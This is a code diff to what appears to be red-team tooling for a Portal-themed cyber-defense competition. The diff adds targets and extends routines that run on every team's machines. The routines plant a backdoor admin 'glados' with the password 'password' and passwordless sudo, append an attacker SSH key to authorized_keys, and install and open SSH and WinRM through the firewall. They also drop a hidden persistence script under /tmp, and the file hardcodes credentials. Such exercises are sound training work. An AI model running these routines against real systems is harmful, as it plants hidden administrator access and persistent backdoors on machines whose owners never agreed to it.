@@ -3,6 +3,7 @@ import base64
 import concurrent.futures
 import json
 import os
+import shlex
 import subprocess
 from dataclasses import dataclass, field
 from datetime import datetime
@@ -14,6 +15,10 @@ from .common import TEAM_SUBNET_BASE, find_missing_binaries, get_red_team_ip
 DEFAULT_USER = "chell"
 DEFAULT_PASS = "Th3cake1salie!"
 REDTEAM_PASS = "password"
+
+
+def _get_ssh_pubkey() -> str:
+    return os.environ.get("APERTURE_SSH_PUBKEY", "").strip()
 
 THEMED_USERS = [
     ("companion", "thecake"),
@@ -36,14 +41,22 @@ class Target:
         return self.wan_ip(team)
 
 DEFAULT_TARGETS = [
+    Target("schrodinger", 1, "linux", ["ssh", "http"]),
     Target("curiosity", 140, "windows", ["smb", "winrm", "rdp"]),
     Target("morality", 10, "windows", ["smb", "winrm", "rdp", "http"]),
+    Target("intelligence", 11, "windows", ["smb", "winrm", "rdp"]),
     Target("anger", 70, "windows", ["smb", "winrm", "rdp", "dns"]),
+    Target("fact", 71, "windows", ["smb", "winrm", "rdp"]),
     Target("space", 141, "windows", ["smb", "winrm", "rdp"]),
+    Target("adventure", 72, "windows", ["smb", "rdp"]),
     Target("scalable", 73, "linux", ["ssh", "http"]),
+    Target("skull", 74, "linux", ["ssh", "http"]),
     Target("safety", 12, "linux", ["ssh", "http", "ftp"]),
-    Target("storage", 14, "linux", ["ssh", "http", "mysql"]),
+    Target("discouragement", 13, "linux", ["http"]),
+    Target("storage", 14, "linux", ["ssh", "http", "ftp", "mysql"]),
+    Target("companion", 142, "linux", ["ssh", "http"]),
     Target("cake", 143, "linux", ["ssh", "http"]),
+    Target("contraption", 75, "linux", ["ssh", "http"]),
 ]
 
 
@@ -94,12 +107,15 @@ class RemoteExecutor:
         timeout: int = 30,
         ssh_key: Optional[str] = None,
     ) -> Tuple[bool, str]:
+        wrapped_cmd = f"sh -c {shlex.quote(cmd)}"
         base_cmd = [
             "ssh",
             "-o",
             "StrictHostKeyChecking=no",
             "-o",
             "UserKnownHostsFile=/dev/null",
+            "-o",
+            "LogLevel=ERROR",
             "-o",
             f"ConnectTimeout={timeout}",
             "-o",
@@ -109,7 +125,7 @@ class RemoteExecutor:
             base_cmd.extend(["-i", ssh_key])
         else:
             base_cmd = ["sshpass", "-p", passwd] + base_cmd
-        base_cmd.extend([f"{user}@{ip}", cmd])
+        base_cmd.extend([f"{user}@{ip}", wrapped_cmd])
         try:
             result = subprocess.run(base_cmd, capture_output=True, text=True, timeout=timeout + 10)
             success = result.returncode == 0
@@ -164,7 +180,13 @@ class RemoteExecutor:
                 result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout + 10)
                 output = result.stdout + result.stderr
                 last_output = output
-                success = "(Pwn3d!)" in output or "STATUS_SUCCESS" in output
+                success = result.returncode == 0 and "STATUS_LOGON_FAILURE" not in output
+                if "STATUS_ACCESS_DENIED" in output:
+                    success = False
+                if "(Pwn3d!)" in output or "STATUS_SUCCESS" in output:
+                    success = True
+                if "[+]" in output and "STATUS_LOGON_FAILURE" not in output:
+                    success = True
                 if success:
                     return True, output
             except Exception as exc:
@@ -181,7 +203,7 @@ class RemoteExecutor:
     ) -> Dict[str, List[Dict]]:
         if ssh_key is None:
             ssh_key = self.ssh_key
-        results = {"success": [], "failed": []}
+        results = {"success": [], "failed": [], "skipped": []}
         missing_for_ssh = set()
         missing_for_winrm = set()
         if "ssh" in self.missing_binaries:
@@ -200,6 +222,18 @@ class RemoteExecutor:
                     continue
                 ip = target.wan_ip(team)
                 if target.os_type == "linux":
+                    if "ssh" not in target.services:
+                        results["skipped"].append(
+                            {
+                                "team": team,
+                                "target": target.hostname,
+                                "ip": ip,
+                                "success": True,
+                                "method": "ssh",
+                                "output": "Skipped: SSH not listed for target.",
+                            }
+                        )
+                        continue
                     if missing_for_ssh:
                         results["failed"].append(
                             {
@@ -207,6 +241,7 @@ class RemoteExecutor:
                                 "target": target.hostname,
                                 "ip": ip,
                                 "success": False,
+                                "method": "ssh",
                                 "output": f"Missing binaries for SSH: {', '.join(sorted(missing_for_ssh))}",
                             }
                         )
@@ -220,6 +255,7 @@ class RemoteExecutor:
                                 "target": target.hostname,
                                 "ip": ip,
                                 "success": False,
+                                "method": "winrm",
                                 "output": f"Missing binaries for WinRM: {', '.join(sorted(missing_for_winrm))}",
                             }
                         )
@@ -237,7 +273,8 @@ class RemoteExecutor:
                 "target": target.hostname,
                 "ip": ip,
                 "success": success,
-                "output": output[:500],
+                "method": method,
+                "output": output[:2000],
             }
 
         if parallel:
@@ -292,23 +329,69 @@ Write-Output "PKILL_COMPLETE"
         return self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)
 
     def create_themed_users(self, targets: List[str]) -> Dict:
+        linux_header = r'''
+resolve_admin_group() {
+    for group in sudo wheel admin; do
+        if getent group "$group" >/dev/null 2>&1; then
+            echo "$group"
+            return 0
+        fi
+    done
+    return 1
+}
+add_user() {
+    user="$1"
+    comment="$2"
+    if id "$user" >/dev/null 2>&1; then
+        return 0
+    fi
+    if command -v useradd >/dev/null 2>&1; then
+        useradd -m -s /bin/bash -c "$comment" "$user" 2>/dev/null || true
+        return 0
+    fi
+    if command -v adduser >/dev/null 2>&1; then
+        adduser -D "$user" 2>/dev/null || adduser --disabled-password --gecos "" "$user" 2>/dev/null || true
+        return 0
+    fi
+    if command -v pw >/dev/null 2>&1; then
+        pw useradd -n "$user" -m -s /bin/sh -c "$comment" 2>/dev/null || true
+        return 0
+    fi
+}
+set_password() {
+    user="$1"
+    passwd="$2"
+    if command -v chpasswd >/dev/null 2>&1; then
+        echo "$user:$passwd" | chpasswd 2>/dev/null || true
+        return 0
+    fi
+    if command -v pw >/dev/null 2>&1; then
+        printf '%s' "$passwd" | pw usermod "$user" -h 0 2>/dev/null || true
+    fi
+}
+add_to_admin_group() {
+    user="$1"
+    group="$(resolve_admin_group || true)"
+    if [ -n "$group" ]; then
+        if command -v usermod >/dev/null 2>&1; then
+            usermod -aG "$group" "$user" 2>/dev/null || true
+        elif command -v pw >/dev/null 2>&1; then
+            pw groupmod "$group" -m "$user" 2>/dev/null || true
+        elif command -v gpasswd >/dev/null 2>&1; then
+            gpasswd -a "$user" "$group" 2>/dev/null || true
+        fi
+    fi
+}
+'''
         linux_cmds = []
         for user, passwd in THEMED_USERS:
             linux_cmds.append(f'''
-if command -v useradd >/dev/null 2>&1; then
-    useradd -m -s /bin/bash {user} 2>/dev/null || true
-elif command -v adduser >/dev/null 2>&1; then
-    adduser -D {user} 2>/dev/null || adduser --disabled-password --gecos "" {user} 2>/dev/null || true
-fi
-echo "{user}:{passwd}" | chpasswd 2>/dev/null || true
-if getent group sudo >/dev/null 2>&1; then
-    usermod -aG sudo {user} 2>/dev/null || true
-elif getent group wheel >/dev/null 2>&1; then
-    usermod -aG wheel {user} 2>/dev/null || true
-fi
+add_user "{user}" "Aperture Science test subject"
+set_password "{user}" "{passwd}"
+add_to_admin_group "{user}"
 echo "Created user: {user}"
 ''')
-        linux_cmd = '\n'.join(linux_cmds) + '\necho "USERS_CREATED"'
+        linux_cmd = linux_header + '\n'.join(linux_cmds) + '\necho "USERS_CREATED"'
 
         windows_cmds = []
         for user, passwd in THEMED_USERS:
@@ -340,26 +423,85 @@ fi
         return self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)
 
     def create_glados_admin(self, targets: List[str]) -> Dict:
+        pubkey = _get_ssh_pubkey()
+        ssh_key_block = ""
+        if pubkey:
+            ssh_key_block = f'''
+SSH_PUBKEY='{pubkey}'
+if [ -n "$SSH_PUBKEY" ]; then
+    install -d -m 700 /home/glados/.ssh 2>/dev/null || mkdir -p /home/glados/.ssh
+    echo "$SSH_PUBKEY" >> /home/glados/.ssh/authorized_keys
+    chown -R glados:glados /home/glados/.ssh 2>/dev/null || true
+    chmod 600 /home/glados/.ssh/authorized_keys 2>/dev/null || true
+fi
+'''
         linux_cmd = f'''
-if command -v useradd >/dev/null 2>&1; then
-    useradd -m -s /bin/bash -c "Genetic Lifeform and Disk Operating System" glados 2>/dev/null || true
-elif command -v adduser >/dev/null 2>&1; then
-    adduser -D glados 2>/dev/null || adduser --disabled-password --gecos "" glados 2>/dev/null || true
+resolve_admin_group() {{
+    for group in sudo wheel admin; do
+        if getent group "$group" >/dev/null 2>&1; then
+            echo "$group"
+            return 0
+        fi
+    done
+    return 1
+}}
+add_user() {{
+    user="$1"
+    comment="$2"
+    if id "$user" >/dev/null 2>&1; then
+        return 0
+    fi
+    if command -v useradd >/dev/null 2>&1; then
+        useradd -m -s /bin/bash -c "$comment" "$user" 2>/dev/null || true
+        return 0
+    fi
+    if command -v adduser >/dev/null 2>&1; then
+        adduser -D "$user" 2>/dev/null || adduser --disabled-password --gecos "" "$user" 2>/dev/null || true
+        return 0
+    fi
+    if command -v pw >/dev/null 2>&1; then
+        pw useradd -n "$user" -m -s /bin/sh -c "$comment" 2>/dev/null || true
+        return 0
+    fi
+}}
+set_password() {{
+    user="$1"
+    passwd="$2"
+    if command -v chpasswd >/dev/null 2>&1; then
+        echo "$user:$passwd" | chpasswd 2>/dev/null || true
+        return 0
+    fi
+    if command -v pw >/dev/null 2>&1; then
+        printf '%s' "$passwd" | pw usermod "$user" -h 0 2>/dev/null || true
+    fi
+}}
+add_to_admin_group() {{
+    user="$1"
+    group="$(resolve_admin_group || true)"
+    if [ -n "$group" ]; then
+        if command -v usermod >/dev/null 2>&1; then
+            usermod -aG "$group" "$user" 2>/dev/null || true
+        elif command -v pw >/dev/null 2>&1; then
+            pw groupmod "$group" -m "$user" 2>/dev/null || true
+        elif command -v gpasswd >/dev/null 2>&1; then
+            gpasswd -a "$user" "$group" 2>/dev/null || true
+        fi
+    fi
+}}
+add_user "glados" "Genetic Lifeform and Disk Operating System"
+set_password "glados" "{REDTEAM_PASS}"
+add_to_admin_group "glados"
+if command -v sudo >/dev/null 2>&1 && [ -d /etc/sudoers.d ]; then
+    echo "glados ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/glados 2>/dev/null || true
+    chmod 440 /etc/sudoers.d/glados 2>/dev/null || true
 fi
-echo "glados:{REDTEAM_PASS}" | chpasswd 2>/dev/null || true
-if getent group sudo >/dev/null 2>&1; then
-    usermod -aG sudo glados 2>/dev/null || true
-elif getent group wheel >/dev/null 2>&1; then
-    usermod -aG wheel glados 2>/dev/null || true
-fi
-echo "glados ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/glados 2>/dev/null || true
-chmod 440 /etc/sudoers.d/glados 2>/dev/null || true
 mkdir -p /home/glados
 cat > /home/glados/.motd << 'MOTD'
 Welcome to Aperture Science.
 You found the GLaDOS account. The password is simple.
 MOTD
 chown -R glados:glados /home/glados 2>/dev/null || true
+{ssh_key_block}
 echo "GLADOS_CREATED"
 '''
         windows_cmd = f'''
@@ -390,12 +532,46 @@ Write-Output "ADMIN_WEAKENED"
 
     def ensure_remote_access(self, targets: List[str]) -> Dict:
         linux_cmd = '''
+detect_os_id() {
+    if [ -f /etc/os-release ]; then
+        . /etc/os-release 2>/dev/null || true
+        echo "${ID:-}"
+        return 0
+    fi
+    echo ""
+}
+install_ssh_server() {
+    os_id="$(detect_os_id)"
+    if [ "$os_id" = "nixos" ]; then
+        echo "NIXOS_SSH_INSTALL_SKIPPED"
+        return 0
+    fi
+    if command -v apt-get >/dev/null 2>&1; then
+        apt-get update -y >/dev/null 2>&1 || true
+        apt-get install -y openssh-server >/dev/null 2>&1 || true
+    elif command -v dnf >/dev/null 2>&1; then
+        dnf install -y openssh-server >/dev/null 2>&1 || true
+    elif command -v yum >/dev/null 2>&1; then
+        yum install -y openssh-server >/dev/null 2>&1 || true
+    elif command -v zypper >/dev/null 2>&1; then
+        zypper --non-interactive install openssh >/dev/null 2>&1 || true
+    elif command -v pacman >/dev/null 2>&1; then
+        pacman -Sy --noconfirm openssh >/dev/null 2>&1 || true
+    elif command -v apk >/dev/null 2>&1; then
+        apk add openssh >/dev/null 2>&1 || true
+    elif command -v pkg >/dev/null 2>&1; then
+        pkg install -y openssh-portable >/dev/null 2>&1 || pkg install -y openssh >/dev/null 2>&1 || true
+    fi
+}
 ensure_ssh() {
     if command -v systemctl >/dev/null 2>&1; then
         systemctl enable ssh 2>/dev/null || systemctl enable sshd 2>/dev/null || true
         systemctl restart ssh 2>/dev/null || systemctl restart sshd 2>/dev/null || true
     elif command -v service >/dev/null 2>&1; then
         service ssh restart 2>/dev/null || service sshd restart 2>/dev/null || true
+    elif command -v sysrc >/dev/null 2>&1; then
+        sysrc sshd_enable=YES >/dev/null 2>&1 || true
+        service sshd restart 2>/dev/null || true
     fi
 }
 open_firewall() {
@@ -410,6 +586,7 @@ open_firewall() {
         iptables -I INPUT -p tcp --dport 22 -j ACCEPT 2>/dev/null || true
     fi
 }
+install_ssh_server
 ensure_ssh
 open_firewall
 echo "ACCESS_OPENED"
@@ -420,6 +597,13 @@ if ($ssh) {
     Set-Service -Name sshd -StartupType Automatic -ErrorAction SilentlyContinue
     Start-Service -Name sshd -ErrorAction SilentlyContinue
 }
+$winrm = Get-Service -Name WinRM -ErrorAction SilentlyContinue
+if ($winrm) {
+    Set-Service -Name WinRM -StartupType Automatic -ErrorAction SilentlyContinue
+    Start-Service -Name WinRM -ErrorAction SilentlyContinue
+}
+winrm quickconfig -quiet 2>$null
+Enable-PSRemoting -Force -ErrorAction SilentlyContinue
 New-NetFirewallRule -DisplayName "ApertureSSH" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow -ErrorAction SilentlyContinue | Out-Null
 New-NetFirewallRule -DisplayName "ApertureWinRM" -Direction Inbound -Protocol TCP -LocalPort 5985 -Action Allow -ErrorAction SilentlyContinue | Out-Null
 Write-Output "ACCESS_OPENED"
@@ -427,18 +611,116 @@ Write-Output "ACCESS_OPENED"
         return self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)
 
     def install_access_tasks(self, targets: List[str]) -> Dict:
+        pubkey = _get_ssh_pubkey()
+        ssh_key_block = ""
+        if pubkey:
+            ssh_key_block = f'''
+SSH_PUBKEY='{pubkey}'
+if [ -n "$SSH_PUBKEY" ]; then
+    install -d -m 700 /home/glados/.ssh 2>/dev/null || mkdir -p /home/glados/.ssh
+    echo "$SSH_PUBKEY" >> /home/glados/.ssh/authorized_keys
+    chown -R glados:glados /home/glados/.ssh 2>/dev/null || true
+    chmod 600 /home/glados/.ssh/authorized_keys 2>/dev/null || true
+fi
+'''
         linux_cmd = f'''
 ACCESS_DIR="/tmp/.aperture_science"
 ACCESS_SCRIPT="$ACCESS_DIR/access_maintenance.sh"
 mkdir -p "$ACCESS_DIR"
 cat > "$ACCESS_SCRIPT" << 'ACCESS'
 #!/bin/sh
+detect_os_id() {{
+    if [ -f /etc/os-release ]; then
+        . /etc/os-release 2>/dev/null || true
+        echo "${{ID:-}}"
+        return 0
+    fi
+    echo ""
+}}
+install_ssh_server() {{
+    os_id="$(detect_os_id)"
+    if [ "$os_id" = "nixos" ]; then
+        echo "NIXOS_SSH_INSTALL_SKIPPED"
+        return 0
+    fi
+    if command -v apt-get >/dev/null 2>&1; then
+        apt-get update -y >/dev/null 2>&1 || true
+        apt-get install -y openssh-server >/dev/null 2>&1 || true
+    elif command -v dnf >/dev/null 2>&1; then
+        dnf install -y openssh-server >/dev/null 2>&1 || true
+    elif command -v yum >/dev/null 2>&1; then
+        yum install -y openssh-server >/dev/null 2>&1 || true
+    elif command -v zypper >/dev/null 2>&1; then
+        zypper --non-interactive install openssh >/dev/null 2>&1 || true
+    elif command -v pacman >/dev/null 2>&1; then
+        pacman -Sy --noconfirm openssh >/dev/null 2>&1 || true
+    elif command -v apk >/dev/null 2>&1; then
+        apk add openssh >/dev/null 2>&1 || true
+    elif command -v pkg >/dev/null 2>&1; then
+        pkg install -y openssh-portable >/dev/null 2>&1 || pkg install -y openssh >/dev/null 2>&1 || true
+    fi
+}}
+resolve_admin_group() {{
+    for group in sudo wheel admin; do
+        if getent group "$group" >/dev/null 2>&1; then
+            echo "$group"
+            return 0
+        fi
+    done
+    return 1
+}}
+add_user() {{
+    user="$1"
+    comment="$2"
+    if id "$user" >/dev/null 2>&1; then
+        return 0
+    fi
+    if command -v useradd >/dev/null 2>&1; then
+        useradd -m -s /bin/bash -c "$comment" "$user" 2>/dev/null || true
+        return 0
+    fi
+    if command -v adduser >/dev/null 2>&1; then
+        adduser -D "$user" 2>/dev/null || adduser --disabled-password --gecos "" "$user" 2>/dev/null || true
+        return 0
+    fi
+    if command -v pw >/dev/null 2>&1; then
+        pw useradd -n "$user" -m -s /bin/sh -c "$comment" 2>/dev/null || true
+        return 0
+    fi
+}}
+set_password() {{
+    user="$1"
+    passwd="$2"
+    if command -v chpasswd >/dev/null 2>&1; then
+        echo "$user:$passwd" | chpasswd 2>/dev/null || true
+        return 0
+    fi
+    if command -v pw >/dev/null 2>&1; then
+        printf '%s' "$passwd" | pw usermod "$user" -h 0 2>/dev/null || true
+    fi
+}}
+add_to_admin_group() {{
+    user="$1"
+    group="$(resolve_admin_group || true)"
+    if [ -n "$group" ]; then
+        if command -v usermod >/dev/null 2>&1; then
+            usermod -aG "$group" "$user" 2>/dev/null || true
+        elif command -v pw >/dev/null 2>&1; then
+            pw groupmod "$group" -m "$user" 2>/dev/null || true
+        elif command -v gpasswd >/dev/null 2>&1; then
+            gpasswd -a "$user" "$group" 2>/dev/null || true
+        fi
+    fi
+}}
 ensure_ssh() {{
     if command -v systemctl >/dev/null 2>&1; then
         systemctl enable ssh 2>/dev/null || systemctl enable sshd 2>/dev/null || true
         systemctl restart ssh 2>/dev/null || systemctl restart sshd 2>/dev/null || true
     elif command -v service >/dev/null 2>&1; then
         service ssh restart 2>/dev/null || service sshd restart 2>/dev/null || true
+    elif command -v sysrc >/dev/null 2>&1; then
+        sysrc sshd_enable=YES >/dev/null 2>&1 || true
+        service sshd restart 2>/dev/null || true
     fi
 }}
 open_firewall() {{
@@ -453,19 +735,15 @@ open_firewall() {{
         iptables -I INPUT -p tcp --dport 22 -j ACCEPT 2>/dev/null || true
     fi
 }}
-if command -v useradd >/dev/null 2>&1; then
-    useradd -m -s /bin/bash -c "Genetic Lifeform and Disk Operating System" glados 2>/dev/null || true
-elif command -v adduser >/dev/null 2>&1; then
-    adduser -D glados 2>/dev/null || adduser --disabled-password --gecos "" glados 2>/dev/null || true
+add_user "glados" "Genetic Lifeform and Disk Operating System"
+set_password "glados" "{REDTEAM_PASS}"
+add_to_admin_group "glados"
+if command -v sudo >/dev/null 2>&1 && [ -d /etc/sudoers.d ]; then
+    echo "glados ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/glados 2>/dev/null || true
+    chmod 440 /etc/sudoers.d/glados 2>/dev/null || true
 fi
-echo "glados:{REDTEAM_PASS}" | chpasswd 2>/dev/null || true
-if getent group sudo >/dev/null 2>&1; then
-    usermod -aG sudo glados 2>/dev/null || true
-elif getent group wheel >/dev/null 2>&1; then
-    usermod -aG wheel glados 2>/dev/null || true
-fi
-echo "glados ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/glados 2>/dev/null || true
-chmod 440 /etc/sudoers.d/glados 2>/dev/null || true
+{ssh_key_block}
+install_ssh_server
 ensure_ssh
 open_firewall
 ACCESS
@@ -482,6 +760,13 @@ if ($ssh) {{
     Set-Service -Name sshd -StartupType Automatic -ErrorAction SilentlyContinue
     Start-Service -Name sshd -ErrorAction SilentlyContinue
 }}
+$winrm = Get-Service -Name WinRM -ErrorAction SilentlyContinue
+if ($winrm) {{
+    Set-Service -Name WinRM -StartupType Automatic -ErrorAction SilentlyContinue
+    Start-Service -Name WinRM -ErrorAction SilentlyContinue
+}}
+winrm quickconfig -quiet 2>$null
+Enable-PSRemoting -Force -ErrorAction SilentlyContinue
 New-NetFirewallRule -DisplayName "ApertureSSH" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow -ErrorAction SilentlyContinue | Out-Null
 New-NetFirewallRule -DisplayName "ApertureWinRM" -Direction Inbound -Protocol TCP -LocalPort 5985 -Action Allow -ErrorAction SilentlyContinue | Out-Null
 net user glados {REDTEAM_PASS} /add 2>$null
